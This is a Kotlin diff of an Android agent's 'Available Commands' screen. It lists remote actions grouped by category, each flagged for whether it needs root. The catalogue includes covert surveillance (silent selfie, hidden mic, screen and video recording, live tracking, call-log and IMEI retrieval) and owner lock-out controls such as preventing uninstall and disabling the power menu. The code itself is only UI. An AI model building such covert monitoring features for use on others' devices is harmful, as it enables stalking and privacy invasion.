@@ -9,187 +9,168 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.google.android.material.chip.Chip
+import com.google.android.material.chip.ChipGroup
 import com.sentrix.agent.R
 import com.sentrix.agent.util.Prefs
-import com.sentrix.agent.util.RootUtil
 
-/**
- * CommandsActivity — shows all available commands grouped by category.
- * Root-aware: restricted commands are dimmed with a tooltip on unrooted devices.
- */
 class CommandsActivity : AppCompatActivity() {
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_commands)
-
-        supportActionBar?.apply {
-            title = "Available Commands"
-            setDisplayHomeAsUpEnabled(true)
-        }
-
-        val isRooted = Prefs.isRooted
+        supportActionBar?.apply { title = "Available Commands"; setDisplayHomeAsUpEnabled(true) }
         val rv = findViewById<RecyclerView>(R.id.rvCategories)
         rv.layoutManager = LinearLayoutManager(this)
-        rv.adapter = CategoryAdapter(CommandData.categories, isRooted)
+        rv.adapter = CategoryAdapter(CommandData.categories, Prefs.isRooted)
     }
-
     override fun onSupportNavigateUp(): Boolean { finish(); return true }
 }
 
-// ── Data ──────────────────────────────────────────────────────────────────────
-
-data class CommandItem(
-    val name: String,
-    val action: String,
-    val requiresRoot: Boolean = false
-)
-
-data class Category(
-    val name: String,
-    val emoji: String,
-    val commands: List<CommandItem>
-)
+data class CommandItem(val name: String, val action: String, val requiresRoot: Boolean = false)
+data class Category(val name: String, val emoji: String, val commands: List<CommandItem>)
 
 object CommandData {
     val categories = listOf(
         Category("Surveillance", "📷", listOf(
-            CommandItem("Screenshot",             "screenshot"),
-            CommandItem("Front Camera Snap",      "front_cam"),
-            CommandItem("Rear Camera Snap",       "rear_cam"),
-            CommandItem("Start Mic Record",       "mic_start"),
-            CommandItem("Stop Mic Record",        "mic_stop"),
-            CommandItem("Start Screen Record",    "screen_capture_start"),
-            CommandItem("Stop Screen Record",     "screen_capture_stop"),
-            CommandItem("Front Video Record",     "front_video_record"),
-            CommandItem("Rear Video Record",      "rear_video_record"),
-            CommandItem("Stop Video Record",      "video_record_stop")
+            CommandItem("Take Screenshot",          "screenshot",          requiresRoot = true),
+            CommandItem("Front Camera Photo",       "front_cam"),
+            CommandItem("Rear Camera Photo",        "rear_cam"),
+            CommandItem("Start Mic Recording",      "mic_start"),
+            CommandItem("Stop Mic Recording",       "mic_stop"),
+            CommandItem("Start Screen Recording",   "screen_record_start"),
+            CommandItem("Stop Screen Recording",    "screen_record_stop"),
+            CommandItem("Start Front Video",        "front_video_start"),
+            CommandItem("Start Rear Video",         "rear_video_start"),
+            CommandItem("Stop Video",               "video_stop"),
+            CommandItem("Silent Selfie",            "selfie_silent"),
+        )),
+        Category("Location & Tracking", "📍", listOf(
+            CommandItem("Get Current Location",     "location_get"),
+            CommandItem("Start Live Tracking",      "location_track_start"),
+            CommandItem("Stop Live Tracking",       "location_track_stop"),
         )),
         Category("Connectivity", "📶", listOf(
-            CommandItem("WiFi On",                "wifi_on",          requiresRoot = true),
-            CommandItem("WiFi Off",               "wifi_off",         requiresRoot = true),
-            CommandItem("Bluetooth On",           "bt_on",            requiresRoot = true),
-            CommandItem("Bluetooth Off",          "bt_off",           requiresRoot = true),
-            CommandItem("Mobile Data On",         "data_on",          requiresRoot = true),
-            CommandItem("Mobile Data Off",        "data_off",         requiresRoot = true),
-            CommandItem("Data Always On",         "data_always_on",   requiresRoot = true),
-            CommandItem("Data Always On (Off)",   "data_normall",     requiresRoot = true),
-            CommandItem("Hotspot On",             "hotspot_on",       requiresRoot = true),
-            CommandItem("Hotspot Off",            "hotspot_off",      requiresRoot = true),
-            CommandItem("Airplane Mode On",       "airplane_on",      requiresRoot = true),
-            CommandItem("Airplane Mode Off",      "airplane_off",     requiresRoot = true)
+            CommandItem("WiFi On",                  "wifi_on",             requiresRoot = true),
+            CommandItem("WiFi Off",                 "wifi_off",            requiresRoot = true),
+            CommandItem("Mobile Data On",           "data_on",             requiresRoot = true),
+            CommandItem("Mobile Data Off",          "data_off",            requiresRoot = true),
+            CommandItem("Bluetooth On",             "bt_on",               requiresRoot = true),
+            CommandItem("Bluetooth Off",            "bt_off",              requiresRoot = true),
+            CommandItem("Hotspot On",               "hotspot_on",          requiresRoot = true),
+            CommandItem("Hotspot Off",              "hotspot_off",         requiresRoot = true),
+            CommandItem("Airplane Mode On",         "airplane_on",         requiresRoot = true),
+            CommandItem("Airplane Mode Off",        "airplane_off",        requiresRoot = true),
         )),
-        Category("Security", "🔐", listOf(
-            CommandItem("Screen Off Mode On",         "screen_off_on",        requiresRoot = true),
-            CommandItem("Screen Off Mode Off",        "screen_off_off",       requiresRoot = true),
-            CommandItem("Barrel Roll On",             "barrel_roll_on",       requiresRoot = true),
-            CommandItem("Barrel Roll Off",            "barrel_roll_off",      requiresRoot = true),
-            CommandItem("Block Screen Touch",         "screen_block_on",      requiresRoot = true),
-            CommandItem("Unblock Screen Touch",       "screen_block_off",     requiresRoot = true),
-            CommandItem("Disable Shutdown Menu",      "nopoweroff_on",        requiresRoot = true),
-            CommandItem("Enable Shutdown Menu",       "nopoweroff_off",       requiresRoot = true),
-            CommandItem("Enable Apps Crash",          "appcrash_on",          requiresRoot = true),
-            CommandItem("Disable Apps Crash",         "appcrash_off",         requiresRoot = true),
-            CommandItem("Enable Call Crash",          "callcrash_on",         requiresRoot = true),
-            CommandItem("Disable Call Crash",         "callcrash_off",        requiresRoot = true),
-            CommandItem("Enable Connectivity Crash",  "servicecrash_on",      requiresRoot = true),
-            CommandItem("Disable Connectivity Crash", "servicecrash_off",     requiresRoot = true),
-            CommandItem("Enable Intruder Actions",    "intruder_on",          requiresRoot = true),
-            CommandItem("Disable Intruder Actions",   "intruder_off",         requiresRoot = true),
-            CommandItem("Enable Statusbar Crash",     "statusbarcrash_on",    requiresRoot = true),
-            CommandItem("Disable Statusbar Crash",    "statusbarcrash_off",   requiresRoot = true),
-            CommandItem("Kill All Apps",              "kill_all_apps",        requiresRoot = true),
-            CommandItem("Loud Ring On",               "loud_ring_on"),
-            CommandItem("Loud Ring Off",              "loud_ring_off"),
-            CommandItem("Auto Speak On",              "speak_on",             requiresRoot = true),
-            CommandItem("Auto Speak Off",             "speak_off",            requiresRoot = true),
-            CommandItem("Disable App Uninstall",      "disable_uninstall",    requiresRoot = true),
-            CommandItem("Enable App Uninstall",       "enable_uninstall",     requiresRoot = true),
-            CommandItem("SIM Change Trigger On",      "enable_simchange"),
-            CommandItem("SIM Change Trigger Off",     "disable_simchange"),
-            CommandItem("Lock Screen",                "lock_screen",          requiresRoot = true),
-            CommandItem("Reboot Device",              "reboot",               requiresRoot = true),
-            CommandItem("Wipe Device ⚠️",             "wipe_device",          requiresRoot = true)
-        )),
-        Category("App Control", "📦", listOf(
-            CommandItem("Disable Play Store",     "play_disable",     requiresRoot = true),
-            CommandItem("Enable Play Store",      "play_enable",      requiresRoot = true)
+        Category("Device Security", "🔐", listOf(
+            CommandItem("Lock Screen",              "lock_screen"),
+            CommandItem("Turn Screen Off",          "screen_off",          requiresRoot = true),
+            CommandItem("Turn Screen On",           "screen_on",           requiresRoot = true),
+            CommandItem("Block Screen Touch",       "touch_block",         requiresRoot = true),
+            CommandItem("Unblock Screen Touch",     "touch_unblock",       requiresRoot = true),
+            CommandItem("Disable Power Menu",       "power_menu_off",      requiresRoot = true),
+            CommandItem("Enable Power Menu",        "power_menu_on",       requiresRoot = true),
+            CommandItem("Encryption Check",         "encryption_check"),
+            CommandItem("Send Alert SMS",           "alert_sms"),
+            CommandItem("Display Lock Message",     "lock_message"),
+            CommandItem("Set Lockscreen Message",   "lockscreen_msg"),
+            CommandItem("Reboot Device",            "reboot",              requiresRoot = true),
+            CommandItem("Factory Reset ⚠️",         "factory_reset",       requiresRoot = true),
         )),
         Category("Anti-Theft", "🚨", listOf(
-            CommandItem("Track Location",         "track_location"),
-            CommandItem("Trigger Anti-Theft",     "theft_on"),
-            CommandItem("Stop Anti-Theft",        "theft_off")
+            CommandItem("Enable Anti-Theft Mode",   "theft_mode_on"),
+            CommandItem("Disable Anti-Theft Mode",  "theft_mode_off"),
+            CommandItem("Trigger Alarm",            "alarm_start"),
+            CommandItem("Stop Alarm",               "alarm_stop"),
+            CommandItem("SIM Change Alert On",      "sim_alert_on"),
+            CommandItem("SIM Change Alert Off",     "sim_alert_off"),
+            CommandItem("Enable Intruder Detection","intruder_on"),
+            CommandItem("Disable Intruder Detection","intruder_off"),
+            CommandItem("Capture Intruder Photo",   "intruder_photo"),
+            CommandItem("Enable Wrong PIN Photo",   "wrong_pin_photo_on"),
+            CommandItem("Disable Wrong PIN Photo",  "wrong_pin_photo_off"),
+            CommandItem("Trigger Safe Mode",        "safe_mode",           requiresRoot = true),
         )),
-        Category("Miscellaneous", "⚙️", listOf(
-            CommandItem("Home Screen",            "home",             requiresRoot = true),
-            CommandItem("Back Button",            "back_button",      requiresRoot = true),
-            CommandItem("Close All Apps",         "close_all",        requiresRoot = true),
-            CommandItem("Collapse Status Bar",    "collaspe_bar",     requiresRoot = true),
-            CommandItem("Flashlight On",          "torch_on"),
-            CommandItem("Flashlight Off",         "torch_off"),
-            CommandItem("Vibrate Device",         "vibrate"),
-            CommandItem("Clear Call Logs",        "clear_call_logs",  requiresRoot = true),
-            CommandItem("Screen Off",             "screen_off",       requiresRoot = true),
-            CommandItem("Screen On",              "screen_on",        requiresRoot = true),
-            CommandItem("Total Launcher",         "launcher_on",      requiresRoot = true),
-            CommandItem("T-UI Launcher",          "launcher_off",     requiresRoot = true),
-            CommandItem("Sudo Kill",              "sudo_kill",        requiresRoot = true),
-            CommandItem("Volume Ring Max",        "vol_ring_max"),
-            CommandItem("Volume Ring Zero",       "vol_ring_zero"),
-            CommandItem("Volume Media Max",       "vol_media_max"),
-            CommandItem("Volume Media Zero",      "vol_media_zero"),
-            CommandItem("Loud Alarm",             "loud_alarm")
-        ))
+        Category("App Management", "📦", listOf(
+            CommandItem("List Installed Apps",      "apps_list"),
+            CommandItem("Check App Status",         "app_status"),
+            CommandItem("Running Apps",             "apps_running"),
+            CommandItem("Close All Background Apps","apps_close_all",      requiresRoot = true),
+            CommandItem("Kill Specific App",        "app_kill",            requiresRoot = true),
+            CommandItem("Disable App",              "app_disable",         requiresRoot = true),
+            CommandItem("Enable App",               "app_enable",          requiresRoot = true),
+            CommandItem("Prevent App Uninstall",    "uninstall_lock",      requiresRoot = true),
+            CommandItem("Allow App Uninstall",      "uninstall_unlock",    requiresRoot = true),
+            CommandItem("Clear App Cache",          "app_cache_clear",     requiresRoot = true),
+        )),
+        Category("Audio & Alerts", "🔊", listOf(
+            CommandItem("Max Ring Volume",          "vol_ring_max"),
+            CommandItem("Mute Ringer",              "vol_ring_mute"),
+            CommandItem("Max Media Volume",         "vol_media_max"),
+            CommandItem("Mute Media",               "vol_media_mute"),
+            CommandItem("Play Loud Siren",          "siren_start"),
+            CommandItem("Stop Siren",               "siren_stop"),
+            CommandItem("Vibrate Device",           "vibrate"),
+        )),
+        Category("Diagnostics", "📋", listOf(
+            CommandItem("Get Device Info",          "device_info"),
+            CommandItem("Get Battery Level",        "battery_get"),
+            CommandItem("Get Storage Info",         "storage_get"),
+            CommandItem("Get Network Info",         "network_info"),
+            CommandItem("Get SIM Info",             "sim_info"),
+            CommandItem("Get Call Logs",            "call_logs_get"),
+            CommandItem("Clear Call Logs",          "call_logs_clear"),
+            CommandItem("Check Root Status",        "root_check"),
+            CommandItem("Get IMEI",                 "imei_get"),
+            CommandItem("Send Notification",        "notify_send"),
+            CommandItem("Ping Device",              "ping"),
+        )),
+        Category("System", "⚙️", listOf(
+            CommandItem("Flashlight On",            "torch_on"),
+            CommandItem("Flashlight Off",           "torch_off"),
+            CommandItem("Go to Home Screen",        "home",                requiresRoot = true),
+            CommandItem("Press Back",               "back",                requiresRoot = true),
+            CommandItem("Collapse Status Bar",      "statusbar_collapse",  requiresRoot = true),
+        )),
     )
 }
 
-// ── Adapters ──────────────────────────────────────────────────────────────────
-
 class CategoryAdapter(
-    private val categories: List<Category>,
-    private val isRooted: Boolean
+    private val cats: List<Category>,
+    private val rooted: Boolean
 ) : RecyclerView.Adapter<CategoryAdapter.VH>() {
 
     inner class VH(v: View) : RecyclerView.ViewHolder(v) {
-        val title:    TextView        = v.findViewById(R.id.tvCategoryTitle)
-        val chipContainer: ViewGroup  = v.findViewById(R.id.chipContainer)
+        val title: TextView    = v.findViewById(R.id.tvCategoryTitle)
+        val chips: ChipGroup   = v.findViewById(R.id.chipContainer)
     }
 
-    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
-        val v = LayoutInflater.from(parent.context)
-            .inflate(R.layout.item_category, parent, false)
-        return VH(v)
-    }
+    override fun onCreateViewHolder(p: ViewGroup, t: Int) =
+        VH(LayoutInflater.from(p.context).inflate(R.layout.item_category, p, false))
 
-    override fun getItemCount() = categories.size
+    override fun getItemCount() = cats.size
 
-    override fun onBindViewHolder(holder: VH, position: Int) {
-        val cat = categories[position]
-        holder.title.text = "${cat.emoji}  ${cat.name}"
-        holder.chipContainer.removeAllViews()
-
+    override fun onBindViewHolder(h: VH, pos: Int) {
+        val cat = cats[pos]
+        h.title.text = "${cat.emoji}  ${cat.name}  (${cat.commands.size})"
+        h.chips.removeAllViews()
         cat.commands.forEach { cmd ->
-            val chip = Chip(holder.itemView.context).apply {
-                text = cmd.name
+            Chip(h.itemView.context).apply {
+                text       = cmd.name
                 isClickable = false
                 isCheckable = false
-
-                if (cmd.requiresRoot && !isRooted) {
-                    // Dimmed — root required
-                    alpha = 0.45f
+                if (cmd.requiresRoot && !rooted) {
+                    alpha = 0.4f
                     setChipBackgroundColorResource(R.color.surface3)
                     setTextColor(context.getColor(R.color.text_secondary))
                     chipIcon = context.getDrawable(android.R.drawable.ic_lock_lock)
                     isChipIconVisible = true
                     chipIconSize = 14f
                 } else {
-                    // Available
                     alpha = 1f
                     setChipBackgroundColorResource(R.color.accent_dim)
                     setTextColor(context.getColor(R.color.text_primary))
                 }
+                h.chips.addView(this)
             }
-            holder.chipContainer.addView(chip)
         }
     }
 }
